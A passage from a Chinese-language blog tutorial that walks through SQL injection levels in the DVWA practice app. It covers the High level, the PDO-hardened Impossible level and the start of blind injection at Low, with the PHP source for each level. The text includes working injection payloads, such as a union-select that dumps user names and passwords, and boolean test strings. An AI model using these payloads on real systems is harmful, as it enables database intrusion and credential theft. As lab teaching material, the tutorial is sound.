1，希望以此控制只输出一个结果。</p><p>High级别的查询提交页面与查询结果显示页面不是同一个，也没有跳转，是为了防止一般的sqlmap注入，</p><p>因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，就无法进一步注入。</p><h3 id="漏洞例用-1" tabindex="-1"><a class="header-anchor" href="#漏洞例用-1"><span>漏洞例用</span></a></h3><p>虽然添加了 LIMIT 1，但是我们可以通过#将其注释掉 ，构建攻击语句 <code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code> ，查询成功</p><p><img src="/blog/assets/image-20220525091302483-DraRzU46.png" alt="image-20220525091302483"></p><h2 id="impossible" tabindex="-1"><a class="header-anchor" href="#impossible"><span>Impossible</span></a></h2><p><strong>源代码</strong></p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;Submit&#39;</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Check Anti-CSRF token</span></span>
<span class="line">    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;user_token&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;session_token&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;index.php&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Was a number entered?</span></span>
<span class="line">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Check the database</span></span>
<span class="line">        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;:id&#39;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// Make sure only 1 result is returned</span></span>
<span class="line">        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token comment">// Get values</span></span>
<span class="line">            <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;first_name&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;last_name&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">            <span class="token comment">// Feedback for end user</span></span>
<span class="line">            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token comment">// Generate Anti-CSRF token</span></span>
<span class="line"><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>分析</strong></p><p>采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p><h1 id="sql-injection-blind" tabindex="-1"><a class="header-anchor" href="#sql-injection-blind"><span>SQL Injection (Blind)</span></a></h1><p>服务端只会返回不会显示搜索值，此类无回显的SQL注入称作SQL盲注。</p><p>其只会返回用户存在与否，即真假，此类盲注成为布尔(bool)盲注。</p><p>注入思路是猜解库表字段和数据的长度，每个猜完长度之后猜解每一位字符的 ASCII 值，然后拼接之后形成字符。</p><p>SQL 盲注步骤：</p><ol><li>判断是否存在注入，注入是字符型还是数字型；</li><li>猜解当前数据库名；</li><li>猜解数据库中的表名；</li><li>猜解表中的字段名；</li><li>猜解数据。</li></ol><p>防御 SQL 注入攻击：</p><ol><li>过滤危险字符：可以使用正则表达式匹配各种 SQL 子句，例如 select,union,where 等，如果匹配到则退出程序。</li><li>使用预编译语句：PDO 提供了一个数据访问抽象层，这意味着不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。使用 PDO 预编译语句应该使用占位符进行数据库的操作，而不是直接将变量拼接进去。</li></ol><h2 id="low-1" tabindex="-1"><a class="header-anchor" href="#low-1"><span>Low</span></a></h2><h3 id="源代码-3" tabindex="-1"><a class="header-anchor" href="#源代码-3"><span>源代码</span></a></h3><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;Submit&#39;</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;SQLI_DB&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token comment">// Check database</span></span>
<span class="line">            <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;<span class="token interpolation"><span class="token variable">$id</span></span>&#39;;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed &#39;or die&#39; to suppress mysql errors</span></span>
<span class="line"></span>
<span class="line">            <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">            <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;<span class="token interpolation"><span class="token variable">$id</span></span>&#39;;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$results</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token variable">$row</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exists</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// User wasn&#39;t found, so the page wasn&#39;t!</span></span>
<span class="line">        <span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;SERVER_PROTOCOL&#39;</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39; 404 Not Found&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="代码分析-3" tabindex="-1"><a class="header-anchor" href="#代码分析-3"><span>代码分析</span></a></h3><p>用 GET 方法传入参数 id，没有经过任何过滤就拿去做 SQL 查询。</p><p>服务器返回这个 id 是否存在。也就是说查询内容不会被回显，存在 SQL 盲注漏洞。</p><p>可通过Bool盲注猜测数据库中的敏感信息</p><h3 id="漏洞利用-1" tabindex="-1"><a class="header-anchor" href="#漏洞利用-1"><span>漏洞利用</span></a></h3><h4 id="字符型注入" tabindex="-1"><a class="header-anchor" href="#字符型注入"><span>字符型注入</span></a></h4><p>尝试输入 <code>1</code> ，查询成功。</p><p><img src="data:image/png;base64,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" alt="image-20220823162357803"></p><p>尝试输入 <code>1&#39; and 1=1 #</code>，查询成功。</p><p><img src="data:image/png;base64,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